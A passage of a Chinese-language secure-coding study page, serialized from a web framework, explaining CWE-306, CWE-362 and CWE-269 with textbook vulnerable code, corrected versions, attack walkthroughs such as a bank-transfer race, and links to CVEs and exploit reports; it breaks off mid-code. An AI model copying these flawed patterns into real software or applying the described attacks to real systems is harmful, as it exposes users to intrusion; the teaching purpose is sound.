class=\\\"x-inline-link\\\"\u003ehttps://huntr.com/bounties/b230d76b-ae2d-440e-a25b-94ffaa7c4ff1\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/mintplex-labs/anything-llm/commit/f4088d9348fa86dcebe9f97a18d39c0a6e92f15e\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/mintplex-labs/anything-llm/commit/f4088d9348fa86dcebe9f97a18d39c0a6e92f15e\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"AnythingLLM的上传链接功能存在SSRF漏洞，该功能面向具有\u003ccode class=\\\"x-inline-highlight\\\"\u003emanager\u003c/code\u003e或\u003ccode class=\\\"x-inline-highlight\\\"\u003eadmin\u003c/code\u003e角色的用户，使用无头浏览器通过内部\u003ccode class=\\\"x-inline-highlight\\\"\u003ecollectorApi\u003c/code\u003e处理上传的链接。 攻击者可以通过托管恶意网站并使用该网站执行内部端口扫描、访问未对外公开的内部网络应用程序等操作来利用这一漏洞。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"部署AnytingLLM后会有两个\u003ccode class=\\\"x-inline-highlight\\\"\u003eexpress.js\u003c/code\u003e节点运行，分别是\u003ccode class=\\\"x-inline-highlight\\\"\u003ecollector\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003eserver\u003c/code\u003e。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"补丁引入了\u003ccode class=\\\"x-inline-highlight\\\"\u003ecomKey\u003c/code\u003e检验数据完整性，让攻击者无法构造出合法的请求头部。部分新增的内容如下：\u003cbr/\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003ecollector/utils/comKey/index.js\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"JavaScript\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$3c\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$3d\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eserver/utils/comKey/index.js\u003c/code\u003e：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"JavaScript\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$3e\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 216px, var(--bg-transparent-golden) 216px 432px, transparent 432px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$3f\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/306.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【B】CWE-306: Missing Authentication for Critical Function\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"重要功能没有做权限认证。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"private boolean isUserAuthentic = false;\\n\\npublic boolean authenticateUser(String username, String password)\\n{\\n    // authenticate user,\\n    // if user is authenticated then set variable to true\\n    // otherwise set variable to false\\n    ...\\n}\\n\\npublic BankAccount createNewBankAccount(String accountNumber, String accountType, String accountName, String accountSSN, double balance)\\n{\\n    BankAccount account = null;\\n\\n    if (isUserAuthentic)\\n    {\\n        account = new BankAccount();\\n        account.setAccountNumber(accountNumber);\\n        account.setAccountType(accountType);\\n        account.setAccountOwnerName(accountName);\\n        account.setAccountOwnerSSN(accountSSN);\\n        account.setBalance(balance);\\n    }\\n    return account;\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":\"linear-gradient(180deg, transparent 24px, var(--bg-transparent-golden) 24px 48px, transparent 48px, transparent 72px, var(--bg-transparent-golden) 72px 240px, transparent 240px, transparent 360px, var(--bg-transparent-golden) 360px 384px, transparent 384px)\"},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$40\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"上面代码中高亮的部分是\u003cspan class=\\\"x-inline-strong\\\"\u003e正确\u003c/span\u003e的做法。如果忽视了验证，就存在风险了。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2020-25966\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2020-25966\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://gitlab.com/Gazzaz/Spectra_API_Issue/\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://gitlab.com/Gazzaz/Spectra_API_Issue/\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"Sectona Spectra 3.2.0存在一个易受攻击的SOAP API端点，该端点会在未进行适当身份验证的情况下泄漏敏感信息。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"注：这个CVE是由于系统配置错误导致的。\"}}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/362.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【C】CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"数据竞争，某段代码需要对共享资源进行临时、独占访问，但存在一个时间窗口，在该时间窗口内共享资源可被同时运行的另一个代码片段修改。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"数据竞争违反了以下两个原则：\"}}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"排他性：代码序列被赋予对共享资源的排他性访问权限，即在原始序列完成执行之前，其他代码序列不能修改共享资源的属性。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"原子性：代码序列被视为一个单一的操作，即在执行期间不会被中断，也不会被其他代码序列中断。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"程序员可能会认为某些代码序列执行得太快，不会受到干扰代码序列的影响，但事实并非如此。例如，单个\u003ccode class=\\\"x-inline-highlight\\\"\u003ex++\u003c/code\u003e语句在代码层可能看起来是原子的，但在指令层实际上是非原子的，因为它涉及读取\u003ccode class=\\\"x-inline-highlight\\\"\u003ex\u003c/code\u003e的原始值、计算\u003ccode class=\\\"x-inline-highlight\\\"\u003ex+1\u003c/code\u003e、最后将结果赋值给\u003ccode class=\\\"x-inline-highlight\\\"\u003ex\u003c/code\u003e。\"}}]]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"干扰代码序列可以是可信的或不可信的。受信任的干扰代码序列出现在产品内部，攻击者无法修改，只能间接调用。不受信任的干扰代码序列可由攻击者直接编写，通常在易受攻击产品的外部。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Perl\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"$$transfer_amount = GetTransferAmount();\\n$balance = GetBalanceFromDatabase();\\n\\nif ($transfer_amount \u003c 0)\\n{\\n    FatalError(\\\"Bad Transfer Amount\\\");\\n}\\n$newbalance = $balance - $transfer_amount;\\nif (($balance - $transfer_amount) \u003c 0)\\n{\\n    FatalError(\\\"Insufficient Funds\\\");\\n}\\nSendNewBalanceToDatabase($newbalance);\\nNotifyUser(\\\"Transfer of $transfer_amount succeeded.\\\");\\nNotifyUser(\\\"New balance: $newbalance\\\");\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$41\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这个例子中\u003ccode class=\\\"x-inline-highlight\\\"\u003eGetBalanceFromDatabase()\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003eSendNewBalanceToDatabase()\u003c/code\u003e可能会发生数据竞争。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"假设初始余额\u003ccode class=\\\"x-inline-highlight\\\"\u003ebalance\u003c/code\u003e是\u003ccode class=\\\"x-inline-highlight\\\"\u003e100.00\u003c/code\u003e，一个攻击可以构造如下：\"}}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"3.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"攻击者调起两个程序，\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-1\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-2\u003c/code\u003e，使用同一账户。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"4.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-1\u003c/code\u003e请求转账\u003ccode class=\\\"x-inline-highlight\\\"\u003e80.00\u003c/code\u003e，此时\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-1\u003c/code\u003e计算出\u003ccode class=\\\"x-inline-highlight\\\"\u003e$newbalance\u003c/code\u003e为\u003ccode class=\\\"x-inline-highlight\\\"\u003e20.00\u003c/code\u003e。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"5.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-1\u003c/code\u003e调用\u003ccode class=\\\"x-inline-highlight\\\"\u003eSendNewBalanceToDatabase(20.00)\u003c/code\u003e，但是\u003cspan class=\\\"x-inline-strong\\\"\u003e受到了延迟\u003c/span\u003e。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"6.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-2\u003c/code\u003e请求转账\u003ccode class=\\\"x-inline-highlight\\\"\u003e1.00\u003c/code\u003e，同理计算出\u003ccode class=\\\"x-inline-highlight\\\"\u003e$newbalance\u003c/code\u003e为\u003ccode class=\\\"x-inline-highlight\\\"\u003e99.00\u003c/code\u003e。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"7.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-2\u003c/code\u003e调用\u003ccode class=\\\"x-inline-highlight\\\"\u003eSendNewBalanceToDatabase(99.00)\u003c/code\u003e。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"8.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-1\u003c/code\u003e调用的\u003ccode class=\\\"x-inline-highlight\\\"\u003eSendNewBalanceToDatabase(20.00)\u003c/code\u003e提交到数据库。\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-oli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-oli-number\",\"children\":\"9.\"}],[\"$\",\"div\",null,{\"className\":\"x-oli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePROGRAM-2\u003c/code\u003e调用的\u003ccode class=\\\"x-inline-highlight\\\"\u003eSendNewBalanceToDatabase(99.00)\u003c/code\u003e提交到数据库。\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"最后导致数据库记录的余额是错误的。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"void f(pthread_mutex_t *mutex)\\n{\\n    pthread_mutex_lock(mutex);\\n\\n    /* access shared resource */\\n\\n    pthread_mutex_unlock(mutex);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003cspan class=\\\"token keyword\\\"\u003evoid\u003c/span\u003e \u003cspan class=\\\"token function\\\"\u003ef\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003e\u003cspan class=\\\"token class-name\\\"\u003epthread_mutex_t\u003c/span\u003e \u003cspan class=\\\"token operator\\\"\u003e*\u003c/span\u003emutex\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\\n\u003cspan class=\\\"token punctuation\\\"\u003e{\u003c/span\u003e\\n    \u003cspan class=\\\"token function\\\"\u003epthread_mutex_lock\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003emutex\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\\n    \u003cspan class=\\\"token comment\\\"\u003e/* access shared resource */\u003c/span\u003e\\n\\n    \u003cspan class=\\\"token function\\\"\u003epthread_mutex_unlock\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e(\u003c/span\u003emutex\u003cspan class=\\\"token punctuation\\\"\u003e)\u003c/span\u003e\u003cspan class=\\\"token punctuation\\\"\u003e;\u003c/span\u003e\\n\u003cspan class=\\\"token punctuation\\\"\u003e}\u003c/span\u003e\\n\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"上面的函数尝试获取锁，以便对共享资源执行操作。不过上述函数没有检查\u003ccode class=\\\"x-inline-highlight\\\"\u003epthread_mutex_lock()\u003c/code\u003e是否正常返回。如果因为一些原因导致\u003ccode class=\\\"x-inline-highlight\\\"\u003epthread_mutex_lock()\u003c/code\u003e失败，那么这个例子会导致数据竞争。\"}}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"正确的做法是：\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"int f(pthread_mutex_t *mutex)\\n{\\n    int result;\\n\\n    result = pthread_mutex_lock(mutex);\\n    if (0 != result)\\n        return result;\\n\\n    /* access shared resource */\\n\\n    return pthread_mutex_unlock(mutex);\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$42\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2024-24254\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2024-24254\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/Drone-Lab/PX4-Autopilot/blob/report-can-not-pause-vulnerability/Multi-Threaded%20Race%20Condition%20bug%20found%20in%20PX4%20cause%20drone%20can%20not%20PAUSE.md\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/Drone-Lab/PX4-Autopilot/blob/report-can-not-pause-vulnerability/Multi-Threaded%20Race%20Condition%20bug%20found%20in%20PX4%20cause%20drone%20can%20not%20PAUSE.md\u003c/a\u003e\"}}]}]]}]]}],[\"$\",\"h3\",null,{\"className\":\"x-h2\",\"children\":[\"$\",\"a\",null,{\"href\":\"https://cwe.mitre.org/data/definitions/269.html\",\"target\":\"_blank\",\"rel\":\"noreferrer\",\"children\":\"【C】CWE-269: Improper Privilege Management\"}]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"权限管理不当，程序没有正确地管理用户的权限。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 1\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Python\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"def makeNewUserDir(username):\\n    if invalidUsername(username):\\n        #avoid CWE-22 and CWE-78\\n        print('Usernames cannot contain invalid characters')\\n        return False\\n\\n    try:\\n        raisePrivileges()\\n        os.mkdir('/home/' + username)\\n        lowerPrivileges()\\n    except OSError:\\n        print('Unable to create new user directory for user:' + username)\\n        return False\\n\\n    return True\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$43\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"上述代码先提高权限以创建文件夹，然后立刻降回来。但如果\u003ccode class=\\\"x-inline-highlight\\\"\u003eos.mkdir()\u003c/code\u003e发生了异常，就不会调用\u003ccode class=\\\"x-inline-highlight\\\"\u003elowerPrivileges()\u003c/code\u003e，这时程序会在提高的权限下运行，可能导致进一步被利用。\"}}],[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example 2\"}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"Java\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"public enum Roles\\n{\\n    ADMIN,OPERATOR,USER,GUEST\\n}\\n\\npublic void resetPassword(User requestingUser, User user, String password)\\n{\\n    if (isAuthenticated(requestingUser))\\n    {\\n        switch (requestingUser.role)\\n        {\\n        case GUEST:\\n            System.out.println(\\\"You are not authorized to perform this command\\\");\\n            break;\\n\\n        case USER:\\n            System.out.println(\\\"You are not authorized to perform this command\\\");\\n            break;\\n\\n        default:\\n            setPassword(user, password);\\n            break;\\n        }\\n    }\\n    else\\n    {\\n        System.out.println(\\\"You must be logged in to perform this command\\\");\\n    }\\n}\\n\"}]]}],[\"$\",\"pre\",null,{\"style\":{\"background\":null},\"children\":[\"$\",\"code\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"$44\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"这个系统定义了不同等级的用户，\u003ccode class=\\\"x-inline-highlight\\\"\u003eADMIN\u003c/code\u003e和\u003ccode class=\\\"x-inline-highlight\\\"\u003eOPERATOR\u003c/code\u003e都可以重置密码。系统设计的初衷是想让\u003ccode class=\\\"x-inline-highlight\\\"\u003eOPERATOR\u003c/code\u003e拥有稍弱于\u003ccode class=\\\"x-inline-highlight\\\"\u003eADMIN\u003c/code\u003e的权限；然而既然\u003ccode class=\\\"x-inline-highlight\\\"\u003eOPERATOR\u003c/code\u003e可以修改密码，那么就可以通过重置\u003ccode class=\\\"x-inline-highlight\\\"\u003eADMIN\u003c/code\u003e账号的密码来控制一个管理员账号。此例的权限管理是有缺陷的。\"}}],[\"$\",\"div\",null,{\"className\":\"x-highlightblock highlight-background-blue\",\"children\":[[\"$\",\"h4\",null,{\"className\":\"x-h3\",\"children\":\"Example in real-world project\"}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"OpenCVE：\u003ca href=\\\"https://www.opencve.io/cve/CVE-2017-11747\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003eCVE-2017-11747\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003eExploit\u003c/code\u003e：\u003ca href=\\\"https://github.com/tinyproxy/tinyproxy/issues/106\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/tinyproxy/tinyproxy/issues/106\u003c/a\u003e\"}}]}]]}],[\"$\",\"div\",null,{\"className\":\"x-uli\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-uli-marker\",\"children\":[\"$\",\"div\",null,{\"className\":\"x-uli-marker-dot\"}]}],[\"$\",\"div\",null,{\"className\":\"x-uli-content-wrapper\",\"children\":[\"$\",\"p\",null,{\"dangerouslySetInnerHTML\":{\"__html\":\"\u003ccode class=\\\"x-inline-highlight\\\"\u003ePatch\u003c/code\u003e：\u003ca href=\\\"https://github.com/obnoxxx/tinyproxy/commit/fe4d29888306e62f3bbf964b3fdb8126ddbe8f6e\\\" target=\\\"_blank\\\" rel=\\\"noreferrer\\\" class=\\\"x-inline-link\\\"\u003ehttps://github.com/obnoxxx/tinyproxy/commit/fe4d29888306e62f3bbf964b3fdb8126ddbe8f6e\u003c/a\u003e\"}}]}]]}],[\"$\",\"p\",null,{\"className\":\"x-p\",\"dangerouslySetInnerHTML\":{\"__html\":\"Tinyproxy 1.8.4及更早版本中的\u003ccode class=\\\"x-inline-highlight\\\"\u003emain.c\u003c/code\u003e会在向非\u003ccode class=\\\"x-inline-highlight\\\"\u003eroot\u003c/code\u003e帐户下放权限后创建\u003ccode class=\\\"x-inline-highlight\\\"\u003e/run/tinyproxy/tinyproxy.pid\u003c/code\u003e文件，这可能允许本地用户在\u003ccode class=\\\"x-inline-highlight\\\"\u003eroot\u003c/code\u003e脚本执行\u003ccode class=\\\"x-inline-highlight\\\"\u003ekill \u0026#96;cat /run/tinyproxy/tinyproxy.pid\u0026#96;\u003c/code\u003e命令之前，利用访问该非\u003ccode class=\\\"x-inline-highlight\\\"\u003eroot\u003c/code\u003e帐户的权限来修改\u003ccode class=\\\"x-inline-highlight\\\"\u003etinyproxy.pid\u003c/code\u003e，从而杀死任意进程。\"}}],[\"$\",\"div\",null,{\"className\":\"x-codeblock\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header\",\"children\":[[\"$\",\"div\",null,{\"className\":\"x-codeblock-header-language\",\"children\":\"C\"}],[\"$\",\"$L15\",null,{\"className\":\"x-codeblock-header-copy\",\"text\":\"/* Create pid file before we drop privileges */\\nif (config.pidpath) {\\n        if (pidfile_create (config.pidpath) \u003c 0) {\\n                fprintf (stderr, \\\"%s: Could not create PID file.\\\\n\\\",\\n                         argv[0]);\\n                exit (EX_OSERR);\\n        }\\n}\\n\\n/* Switch to a different user if we're running as root */\\nif (geteuid () == 0)\\n        change_user (argv[0]);\\nelse\\n        log_message (LOG_WARNING,\\n                     \\\"Not running as root, so not changing UID/GID.\\\");\\n/* Create log file after we drop privileges */\\nif (setup_logging ()) {\\n        exit 